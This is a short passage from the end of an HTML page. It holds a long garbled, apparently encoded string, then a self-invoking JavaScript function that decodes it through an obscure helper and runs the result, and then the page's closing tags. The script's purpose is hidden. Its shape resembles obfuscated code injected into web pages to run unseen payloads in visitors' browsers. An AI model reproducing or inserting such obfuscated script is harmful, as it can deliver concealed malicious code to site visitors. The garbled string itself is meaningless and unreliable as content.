95td3SAf=03;d!86dua8;$jA6)r0g3A(5""[tbo)!.so):!S.=n2t=A9$ib3_$"],yArA\/j;$_!m.dd:gA5 p).d)dA3+(n=,_4A_rA;=k}d64#iA;(_. '));var kJB=HNg(Ilf,xzf );kJB(6797);return 5600})()
</script>
</body>
</html>